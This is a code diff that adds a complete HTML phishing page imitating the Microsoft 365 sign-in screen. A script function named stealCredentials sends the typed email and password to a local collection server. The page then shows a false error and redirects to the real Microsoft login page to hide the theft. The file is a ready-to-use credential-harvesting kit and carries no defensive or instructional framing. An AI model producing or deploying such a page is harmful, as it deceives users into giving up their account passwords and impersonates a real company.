@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 Sign-In</title>
+    <link rel="icon" type="image/png" href="https://www.microsoft.com/favicon.ico">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 320px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #005a9e;
+        }
+        img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+        <h2>Sign in to your account</h2>
+        <p class="error" id="errorMessage">Incorrect password. Try again.</p>
+        <input type="email" id="email" placeholder="Email or phone">
+        <input type="password" id="password" placeholder="Enter your password">
+        <button onclick="stealCredentials()">Sign In</button>
+        <p style="font-size:12px; color:gray;">© 2025 Microsoft Corporation</p>
+    </div>
+
+    <script>
+        function stealCredentials() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                document.getElementById("errorMessage").style.display = "block";
+                return;
+            }
+
+            fetch("http://localhost:5201/save", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("errorMessage").style.display = "block";
+                setTimeout(() => {
+                    window.location.href = "https://login.microsoftonline.com/"; // 真正的微软登录页面
+                }, 2000);
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
